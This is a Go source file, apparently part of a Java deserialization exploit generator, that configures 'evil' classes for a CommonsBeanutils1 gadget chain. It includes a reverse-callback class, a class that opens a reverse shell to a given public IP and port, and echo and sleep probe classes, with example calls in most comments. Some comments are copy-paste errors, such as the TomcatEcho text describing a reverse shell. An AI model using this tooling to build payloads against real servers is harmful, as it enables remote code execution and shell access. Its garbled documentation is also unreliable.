//
// Example:
//
// host = "公网IP"
// token = uuid()
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
func SetClassTcpReverseTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseClass
	}
}

// SetTcpReverseHost
// tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。
// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
//
// host：要设置的 tcpReverseHost 的host。
//
// Example:
//
// host = "公网IP"
// token = uuid()
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
func SetTcpReverseHost(host string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Host = host
	}
}

// SetTcpReversePort
// tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。
// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
//
// port：要设置的 tcpReversePort 的port。
//
// Example:
//
// host = "公网IP"
// token = uuid()
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
func SetTcpReversePort(port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Port = port
	}
}

// SetTcpReverseToken
// tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。
//
// token：要设置的 token 。
//
// Example:
//
// host = "公网IP"
// token = uuid()
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
func SetTcpReverseToken(token string) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.Token = token
	}
}

// SetTcpReverseEvilClass
// useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。
// 相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。
//
// host：要设置的 tcpReverseHost 的host。
//
// port：要设置的 tcpReversePort 的port。
//
// Example:
//
// host = "公网IP"
// token = uuid()
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseClass
		config.Host = host
		config.Port = port
	}
}

// GenTcpReverseClassObject
//
// GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。
//
// host：要设置的 tcpReverseHost 的host。
//
// port：要设置的 tcpReversePort 的port。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// host = "公网IP"
// token = uuid()
//
// classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象
func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.Host = host
	config.Port = port
	config.ClassType = TcpReverseClass
	return config.GenerateClassObject()
}

// SetClassTcpReverseShellTemplate
// useTcpReverseShellTemplate 请求参数选项函数，用于设置生成TcpReverseShell类的模板，需要配合 tcpReverseShellHost 和 tcpReverseShellPort 使用。
// 该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。
//
// Example:
//
// host = "公网IP"
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
func SetClassTcpReverseShellTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseShellClass
	}
}

// SetTcpReverseShellEvilClass
// useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。
// 相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。
//
// host：要设置的 tcpReverseShellHost 的host。
//
// port：要设置的 tcpReverseShellPort 的port。
//
// Example:
//
// host = "公网IP"
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TcpReverseShellClass
		config.Host = host
		config.Port = port
	}
}

// GenTcpReverseShellClassObject
//
// GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。
//
// host：要设置的 tcpReverseShellHost 的host。
//
// port：要设置的 tcpReverseShellPort 的port。
//
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
//
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// host = "公网IP"
//
// classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象
func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.Host = host
	config.Port = port
	config.ClassType = TcpReverseShellClass
	return config.GenerateClassObject()
}

// SetClassTomcatEchoTemplate
// useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 tomcatEchoHost 和 tomcatEchoPort 使用。
// 该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。
//
// Example:
//
// host = "公网IP"
//
// yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.tomcatEchoHost(host),yso.tomcatEchoPort(8080))
func SetClassTomcatEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TomcatEchoClass
	}
}

func SetTomcatEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = TomcatEchoClass
	}
}
func GenTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = TomcatEchoClass
	return config.GenerateClassObject()
}

// MultiEcho
func SetClassMultiEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = MultiEchoClass
	}
}

func SetMultiEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = MultiEchoClass
	}
}
func GenMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = MultiEchoClass
	return config.GenerateClassObject()
}

// HeaderEchoClass
func SetClassHeaderEchoTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = HeaderEchoClass
	}
}

func SetHeaderEchoEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = HeaderEchoClass
	}
}
func GenHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = HeaderEchoClass
	return config.GenerateClassObject()
}

// SleepClass
func SetClassSleepTemplate() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = SleepClass
	}
}

func SetSleepEvilClass() GenClassOptionFun {
	return func(config *ClassConfig) {
		config.ClassType = SleepClass
	}
}
func GenSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	config.ClassType = SleepClass
	return config.GenerateClassObject()
}
func SetSleepTime(time int) GenClassOptionFun {
	return func(config *ClassConfig) {
		config.SleepTime = time
	}
}
